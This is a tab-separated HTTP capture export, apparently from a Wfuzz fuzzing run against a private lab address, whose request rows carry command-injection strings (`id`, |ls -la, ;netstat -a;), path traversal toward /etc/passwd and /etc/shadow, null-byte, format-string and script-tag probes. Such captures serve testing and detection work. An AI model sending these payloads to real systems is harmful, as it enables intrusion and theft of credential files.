http.accept	http.accept_encoding	http.accept_language	http.authbasic	http.authcitrix	http.authcitrix.domain	http.authcitrix.password	http.authcitrix.session	http.authcitrix.user	http.authorization	http.bad_header_name	http.cache_control	http.chat	http.chunk_boundary	http.chunk_size	http.chunkd_and_length	http.chunked_trailer_part	http.connection	http.content_encoding	http.content_length	http.content_length_header	http.content_type	http.cookie_pair	http.date	http.decompression_disabled	http.decompression_failed	http.file_data	http.host	http.http2_settings	http.http2_settings_uri	http.last_modified	http.leading_crlf	http.location	http.next_request_in	http.next_response_in	http.notification	http.prev_request_in	http.proxy_authenticate	http.proxy_authorization	http.proxy_connect_host	http.proxy_connect_port	http.referer	http.request	http.request.full_uri	http.request.line	http.request.method	http.request.uri.path	http.request.uri.query	http.request.uri.query.parameter	http.request.version	http.request_in	http.request_number	http.sec_websocket_accept	http.sec_websocket_extensions	http.sec_websocket_key	http.sec_websocket_protocol	http.sec_websocket_version	http.server	http.set_cookie	http.ssl_port	http.subdissector_failed	http.te_and_length	http.te_unknown	http.time	http.tls_port	http.transfer_encoding	http.unknown_header	http.upgrade	http.user_agent	http.www_authenticate	http.x_forwarded_for	http.cookie	http.request.uri
*/*																					application/x-www-form-urlencoded						192.168.1.109															1	http://192.168.1.109/web/\nnetstat%20-a%\n/		GET				HTTP/1.1																			Wfuzz/3.1.0				/web/\nnetstat%20-a%\n/
*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*																					application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded						192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109									246,246,246,246,246,246,246,246,246,246,246,246						1,1,1,1,1,1,1,1,1,1,1,1,1	http://192.168.1.109/web/FALSE/,http://192.168.1.109/web/-1/,http://192.168.1.109/web/-2/,http://192.168.1.109/web/-268435455/,http://192.168.1.109/web/null/,http://192.168.1.109/web/\0/,http://192.168.1.109/web/`id`/,http://192.168.1.109/web/\0\0\0/,http://192.168.1.109/web/|id/,http://192.168.1.109/web/id%00|/,http://192.168.1.109/web/?x=|/,http://192.168.1.109/web/../../../../../../../../../../../../etc/hosts%00/,http://192.168.1.109/web//../../../../../../../../%2A/		GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET				HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1																			Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0				/web/FALSE/,/web/-1/,/web/-2/,/web/-268435455/,/web/null/,/web/\0/,/web/`id`/,/web/\0\0\0/,/web/|id/,/web/id%00|/,/web/?x=|/,/web/../../../../../../../../../../../../etc/hosts%00/,/web//../../../../../../../../%2A/
*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*																					application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded						192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109									249,249,249,249,249,249,249,249,249,249						1,1,1,1,1,1,1,1,1,1,1	http://192.168.1.109/web/00/,http://192.168.1.109/web/2/,http://192.168.1.109/web/268435455/,http://192.168.1.109/web/%0a/,http://192.168.1.109/web/+%00/,http://192.168.1.109/web/$NULL/,http://192.168.1.109/web/`dir`/,http://192.168.1.109/web/|ls%20-la/,http://192.168.1.109/web/|dir/,http://192.168.1.109/web/\n/bin/ls%20-al\n/,http://192.168.1.109/web/../../boot.ini/		GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET				HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1																			Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0				/web/00/,/web/2/,/web/268435455/,/web/%0a/,/web/+%00/,/web/$NULL/,/web/`dir`/,/web/|ls%20-la/,/web/|dir/,/web/\n/bin/ls%20-al\n/,/web/../../boot.ini/
*/*,*/*,*/*,*/*,*/*,*/*,*/*																					application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded						192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109									251,251,251,251,251,251						1,1,1,1,1,1,1	http://192.168.1.109/web/0/,http://192.168.1.109/web/%00/,http://192.168.1.109/web/$null/,http://192.168.1.109/web/|id|/,http://192.168.1.109/web/|ls/,http://192.168.1.109/web/?x=>/,http://192.168.1.109/web/ABCD|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|/		GET,GET,GET,GET,GET,GET,GET				HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1																			Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0				/web/0/,/web/%00/,/web/$null/,/web/|id|/,/web/|ls/,/web/?x=>/,/web/ABCD|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|%8.8x|/
*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*																					application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded						192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109									269,269,269,269,269,269,269,269,269,269,269						1,1,1,1,1,1,1,1,1,1,1,1	http://192.168.1.109/web/A/,http://192.168.1.109/web/1/,http://192.168.1.109/web/-1.0/,http://192.168.1.109/web/65536/,http://192.168.1.109/web/0xfffffff/,http://192.168.1.109/web/NULL/,http://192.168.1.109/web/\00\00\00/,http://192.168.1.109/web/\0/,http://192.168.1.109/web/id%00/,http://192.168.1.109/web/|dir|/,http://192.168.1.109/web/?x=/,http://192.168.1.109/web/../../../../../../../../../../../../etc/hosts/		GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET				HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1																			Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0				/web/A/,/web/1/,/web/-1.0/,/web/65536/,/web/0xfffffff/,/web/NULL/,/web/\00\00\00/,/web/\0/,/web/id%00/,/web/|dir|/,/web/?x=/,/web/../../../../../../../../../../../../etc/hosts/
*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*																					application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded						192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109									290,290,290,290,290,290,290						1,1,1,1,1,1,1,1	http://192.168.1.109/web/1.0/,http://192.168.1.109/web/\00/,http://192.168.1.109/web/\00/,http://192.168.1.109/web/\"blah/,http://192.168.1.109/web/;ls%20-la/,http://192.168.1.109/web//boot.ini/,http://192.168.1.109/web//index.html|id|/,http://192.168.1.109/web//../../../../../../../../../../etc/passwd^^/		GET,GET,GET,GET,GET,GET,GET,GET				HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1																			Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0				/web/1.0/,/web/\00/,/web/\00/,/web/\"blah/,/web/;ls%20-la/,/web//boot.ini/,/web//index.html|id|/,/web//../../../../../../../../../../etc/passwd^^/
*/*,*/*,*/*																					application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded						192.168.1.109,192.168.1.109,192.168.1.109									292,292						1,1,1	http://192.168.1.109/web/&quot;;id&quot;/,http://192.168.1.109/web//etc/passwd/,http://192.168.1.109/web/../../../../../../../../../../../../etc/passwd/		GET,GET,GET				HTTP/1.1,HTTP/1.1,HTTP/1.1																			Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0				/web/&quot;;id&quot;/,/web//etc/passwd/,/web/../../../../../../../../../../../../etc/passwd/
*/*,*/*,*/*																					application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded						192.168.1.109,192.168.1.109,192.168.1.109									294,294						1,1,1	http://192.168.1.109/web/;id;/,http://192.168.1.109/web/../../../../../../../../../../../../etc/passwd%00/,http://192.168.1.109/web/../../../../../../../../../../../../etc/shadow/		GET,GET,GET				HTTP/1.1,HTTP/1.1,HTTP/1.1																			Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0				/web/;id;/,/web/../../../../../../../../../../../../etc/passwd%00/,/web/../../../../../../../../../../../../etc/shadow/
*/*,*/*																					application/x-www-form-urlencoded,application/x-www-form-urlencoded						192.168.1.109,192.168.1.109									296						1,1	http://192.168.1.109/web/;netstat%20-a;/,http://192.168.1.109/web//../../../../../../../../../../etc/shadow^^/		GET,GET				HTTP/1.1,HTTP/1.1																			Wfuzz/3.1.0,Wfuzz/3.1.0				/web/;netstat%20-a;/,/web//../../../../../../../../../../etc/shadow^^/
*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*,*/*																					application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded,application/x-www-form-urlencoded						192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109,192.168.1.109									318,318,318,318,318,318,318,318,318,318,318,318						1,1,1,1,1,1,1,1,1,1,1,1,1	http://192.168.1.109/web/TRUE/,http://192.168.1.109/web/-20/,http://192.168.1.109/web/2147483647/,http://192.168.1.109/web/<%20%20script%20>%20<%20/%20script>/,http://192.168.1.109/web/\0\0/,http://192.168.1.109/web/\00\00/,http://192.168.1.109/web/;read;/,http://192.168.1.109/web/;dir/,http://192.168.1.109/web/|/bin/ls%20-al/,http://192.168.1.109/web/?x="/,http://192.168.1.109/web//etc/shadow/,http://192.168.1.109/web/../../../../../../../../../../../../etc/shadow%00/,http://192.168.1.109/web//../../../../../../../../../../etc/shadow/		GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET,GET				HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1,HTTP/1.1																			Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0,Wfuzz/3.1.0				/web/TRUE/,/web/-20/,/web/2147483647/,/web/<%20%20script%20>%20<%20/%20script>/,/web/\0\0/,/web/\00\00/,/web/;read;/,/web/;dir/,/web/|/bin/ls%20-al/,/web/?x="/,/web//etc/shadow/,/web/../../../../../../../../../../../../etc/shadow%00/,/web//../../../../../../../../../../etc/shadow/
